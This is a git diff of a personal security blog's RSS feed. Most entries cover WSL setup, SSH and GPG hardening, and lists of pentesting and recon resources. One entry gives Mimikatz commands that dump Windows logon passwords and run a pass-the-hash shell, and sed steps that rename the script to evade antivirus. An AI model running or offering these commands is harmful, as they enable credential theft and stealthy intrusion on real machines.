@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>BLACKVOLGA</title>
+    <title>BLVCKƔXLGV</title>
     <link>https://blackvolga.github.io/</link>
-    <description>Recent content on BLACKVOLGA</description>
+    <description>Recent content on BLVCKƔXLGV</description>
     <generator>Hugo -- gohugo.io</generator>
     <managingEditor>blackvolga@pm.me (GAZ23)</managingEditor>
     <webMaster>blackvolga@pm.me (GAZ23)</webMaster>
@@ -18,12 +18,8 @@
       <pubDate>Sat, 06 Oct 2018 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/post/wsl/</guid>
-      <description>Sometimes we all get stuck on a windows machine. Luckily Windows subsystem for Linux has matured into a surprising alternative to cygwin or VMs for your basic terminal needs.
-First Thing&amp;rsquo;s First
-Windows 10 is a clusterfuck of bloatware, ads and tracking. Remove as much as you can before you begin (why haven&amp;rsquo;t you done this already?)
-https://github.com/adolfintel/Windows10-Privacy
-Debian WSL Install
- Install WSL - Open PowerShell as Administrator (restart required) Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux Install Debian Invoke-WebRequest -Uri https://aka.</description>
+      <description>&lt;p&gt;Sometimes we all get stuck on a windows machine. Since the &lt;a href=&#34;https://blogs.msdn.microsoft.com/commandline/2018/03/06/debian-gnulinux-for-wsl-now-available-in-the-windows-store/&#34; target=&#34;_blank&#34;&gt;March 2018 Update&lt;/a&gt;, Windows Subsystem for Linux has become a surprisingly superior alternative to cygwin for your basic terminal needs.&lt;br /&gt;
+&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -32,20 +28,18 @@ Debian WSL Install
       <pubDate>Tue, 03 Oct 2017 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/101/</guid>
-      <description>#OS Antergos OR TAILS
-Start with the basics: https://ssd.eff.org/en Advanced Mode: https://www.qubes-os.org/
-##Arch First Steps
-https://github.com/Jguer/yay
+      <description>OS Antergos OR TAILS
+Start with the basics: https://ssd.eff.org/en
+Advanced Mode: https://www.qubes-os.org/
+Arch First Steps https://github.com/Jguer/yay
 https://github.com/sorin-ionescu/prezto
 https://wiki.archlinux.org/index.php/security
 For everything else, see the oracle: wiki.archlinux.org
-##SSH
-EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
+SSH EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
 ssh-keygen -t ed25519 -a 100 OR ssh-keygen -t rsa -b 4096 -o -a 100
 Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
-##GPG
-~/.gnupg/gpg.conf:
-# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 ###Create Master Key gpg2 --expert --full-gen-key OPTION 8 &amp;gt; s &amp;gt; e &amp;gt; q 4096 &amp;gt; 1y &amp;gt; y</description>
+GPG ~/.gnupg/gpg.conf:
+# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 Create Master Key gpg2 --expert --full-gen-key</description>
     </item>
     
     <item>
@@ -56,93 +50,12 @@ Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
       <guid>https://blackvolga.github.io/intel/powershell/</guid>
       <description>https://github.com/gentilkiwi/mimikatz
 https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-TLDR: 1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+TLDR:
+1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
 extract passwds
 1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
 1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
 1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &amp;#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&amp;#39; Invoke-MimiDawgz.ps1 4sed -i -e &amp;#39;/&amp;lt;#/,/#&amp;gt;/c\\&amp;#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &amp;#39;s/^[[:space:]]*#.*$//g&amp;#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &amp;#39;s/DumpCreds/DumpCred/g&amp;#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &amp;#39;s/ArgumentPtr/NotTodayPal/g&amp;#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &amp;#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&amp;#39; 13Invoke-MimiDawgz.</description>
-    </item>
-    
-    <item>
-      <title>Photoswipe Gallery Sample</title>
-      <link>https://blackvolga.github.io/post/001/</link>
-      <pubDate>Mon, 20 Mar 2017 00:00:00 +0000</pubDate>
-      <author>blackvolga@pm.me (GAZ23)</author>
-      <guid>https://blackvolga.github.io/post/001/</guid>
-      <description>&lt;p&gt;Beautiful Hugo adds a few custom shortcodes created by &lt;a href=&#34;https://www.liwen.id.au/heg/&#34;&gt;Li-Wen Yip&lt;/a&gt; and &lt;a href=&#34;https://github.com/GjjvdBurg/HugoPhotoSwipe&#34;&gt;Gert-Jan van den Berg&lt;/a&gt; for making galleries with &lt;a href=&#34;http://photoswipe.com&#34;&gt;PhotoSwipe&lt;/a&gt; .&lt;/p&gt;
-
-
-
-
-&lt;div class=&#34;gallery caption-position-bottom caption-effect-fade hover-effect-zoom hover-transition&#34; itemscope itemtype=&#34;http://schema.org/ImageGallery&#34;&gt;
-	  
-  
-&lt;link rel=&#34;stylesheet&#34; href=&#34;https://blackvolga.github.io/css/hugo-easy-gallery.css&#34; /&gt;
-&lt;div class=&#34;box&#34; &gt;
-  &lt;figure  itemprop=&#34;associatedMedia&#34; itemscope itemtype=&#34;http://schema.org/ImageObject&#34;&gt;
-    &lt;div class=&#34;img&#34; style=&#34;background-image: url(&#39;https://blackvolga.github.io/img/hexagon-thumb.jpg&#39;);&#34;&gt;
-      &lt;img itemprop=&#34;thumbnail&#34; src=&#34;https://blackvolga.github.io/img/hexagon-thumb.jpg&#34; /&gt;
-    &lt;/div&gt;
-    &lt;a href=&#34;https://blackvolga.github.io/img/hexagon.jpg&#34; itemprop=&#34;contentUrl&#34;&gt;&lt;/a&gt;
-  &lt;/figure&gt;
-&lt;/div&gt;
-
-  
-
-&lt;div class=&#34;box&#34; &gt;
-  &lt;figure  itemprop=&#34;associatedMedia&#34; itemscope itemtype=&#34;http://schema.org/ImageObject&#34;&gt;
-    &lt;div class=&#34;img&#34; style=&#34;background-image: url(&#39;https://blackvolga.github.io/img/sphere-thumb.jpg&#39;);&#34;&gt;
-      &lt;img itemprop=&#34;thumbnail&#34; src=&#34;https://blackvolga.github.io/img/sphere-thumb.jpg&#34; alt=&#34;Sphere&#34;/&gt;
-    &lt;/div&gt;
-    &lt;a href=&#34;https://blackvolga.github.io/img/sphere.jpg&#34; itemprop=&#34;contentUrl&#34;&gt;&lt;/a&gt;
-      &lt;figcaption&gt;
-          &lt;p&gt;Sphere&lt;/p&gt;
-      &lt;/figcaption&gt;
-  &lt;/figure&gt;
-&lt;/div&gt;
-
-  
-
-&lt;div class=&#34;box&#34; &gt;
-  &lt;figure  itemprop=&#34;associatedMedia&#34; itemscope itemtype=&#34;http://schema.org/ImageObject&#34;&gt;
-    &lt;div class=&#34;img&#34; style=&#34;background-image: url(&#39;https://blackvolga.github.io/img/triangle-thumb.jpg&#39;);&#34;&gt;
-      &lt;img itemprop=&#34;thumbnail&#34; src=&#34;https://blackvolga.github.io/img/triangle-thumb.jpg&#34; alt=&#34;This is a long comment about a triangle&#34;/&gt;
-    &lt;/div&gt;
-    &lt;a href=&#34;https://blackvolga.github.io/img/triangle.jpg&#34; itemprop=&#34;contentUrl&#34;&gt;&lt;/a&gt;
-      &lt;figcaption&gt;
-          &lt;p&gt;Triangle&lt;/p&gt;
-      &lt;/figcaption&gt;
-  &lt;/figure&gt;
-&lt;/div&gt;
-
-
-&lt;/div&gt;
-
-
-&lt;p&gt;&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>Big Image Sample</title>
-      <link>https://blackvolga.github.io/post/002/</link>
-      <pubDate>Tue, 07 Mar 2017 00:00:00 +0000</pubDate>
-      <author>blackvolga@pm.me (GAZ23)</author>
-      <guid>https://blackvolga.github.io/post/002/</guid>
-      <description>&lt;p&gt;The image banners at the top of the page are refered to as &amp;ldquo;bigimg&amp;rdquo; in this theme. They are optional, and one more more can be specified. If more than one is specified, the images rotate every 10 seconds. In the front matter, bigimgs are specified using an array of hashes.&lt;/p&gt;
-
-&lt;p&gt;&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>Test markdown</title>
-      <link>https://blackvolga.github.io/post/003/</link>
-      <pubDate>Fri, 20 Feb 2015 00:00:00 +0000</pubDate>
-      <author>blackvolga@pm.me (GAZ23)</author>
-      <guid>https://blackvolga.github.io/post/003/</guid>
-      <description>You can write regular markdown here and Jekyll will automatically convert it to a nice webpage. I strongly encourage you to take 5 minutes to learn how to write in markdown - it&amp;rsquo;ll teach you how to transform regular text into bold/italics/headings/tables/etc.
-Here is some bold text
-Here is a secondary heading Here&amp;rsquo;s a useless table:
-   Number Next number Previous number     Five Six Four   Ten Eleven Nine   Seven Eight Six   Two Three One    How about a yummy crepe?</description>
     </item>
     
     <item>
@@ -169,10 +82,11 @@ Here is a secondary heading Here&amp;rsquo;s a useless table:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/links/</guid>
-      <description>Email https://protonmail.com/
-Chat https://crypto.cat/
+      <description>Self Defense https://ssd.eff.org
 Notepad http://etherpad.org/
-https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf</description>
+Email https://protonmail.com/
+Chat https://crypto.cat/
+Mobile https://signal.org/</description>
     </item>
     
     <item>
@@ -181,7 +95,21 @@ https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf</des
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/pentest/</guid>
-      <description>https://github.com/enaqx/awesome-pentest https://github.com/sbilly/awesome-security https://github.com/meirwah/awesome-incident-response https://github.com/coreb1t/awesome-pentest-cheat-sheets https://github.com/carpedm20/awesome-hacking https://github.com/vitalysim/Awesome-Hacking-Resources https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html https://github.com/yeyintminthuhtut/Awesome-Red-Teaming https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki https://wiki.sans.blue/#!index.md https://www.cybrary.it/ https://mkto.cisco.com/security-scholarship https://nostarch.com/nsm https://nostarch.com/packetanalysis3</description>
+      <description>https://github.com/enaqx/awesome-pentest
+https://github.com/sbilly/awesome-security
+https://github.com/meirwah/awesome-incident-response
+https://github.com/coreb1t/awesome-pentest-cheat-sheets
+https://github.com/carpedm20/awesome-hacking
+https://github.com/vitalysim/Awesome-Hacking-Resources
+https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges
+https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html
+https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
+https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
+https://wiki.sans.blue/#!index.md
+https://www.cybrary.it/
+https://mkto.cisco.com/security-scholarship
+https://nostarch.com/nsm
+https://nostarch.com/packetanalysis3</description>
     </item>
     
     <item>
@@ -190,9 +118,13 @@ https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf</des
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/random/</guid>
-      <description>ASCII/ANSI ART https://github.com/nrlquaker/nfov
-Fonts https://github.com/rewtnull/amigafonts https://github.com/ansilove/BlockZone
-Misc 3d scanning - https://github.com/alicevision/meshroom</description>
+      <description>ASCII/ANSI ART
+https://github.com/nrlquaker/nfov
+Fonts
+https://github.com/rewtnull/amigafonts
+https://github.com/ansilove/BlockZone
+Misc
+3d scanning - https://github.com/alicevision/meshroom</description>
     </item>
     
     <item>
@@ -202,8 +134,13 @@ Misc 3d scanning - https://github.com/alicevision/meshroom</description>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/tools/</guid>
       <description>Living Off The Land: https://github.com/LOLBAS-Project/LOLBAS
-Recon https://github.com/jordanpotti/AWSBucketDump https://github.com/laramies/theHarvester https://github.com/thewhiteh4t/pwnedOrNot
-DNS https://github.com/darkoperator/dnsrecon https://github.com/michenriksen/aquatone
+Recon
+https://github.com/jordanpotti/AWSBucketDump
+https://github.com/laramies/theHarvester
+https://github.com/thewhiteh4t/pwnedOrNot
+DNS
+https://github.com/darkoperator/dnsrecon
+https://github.com/michenriksen/aquatone
 https://github.com/infosecn1nja/Red-Teaming-Toolkit</description>
     </item>
     
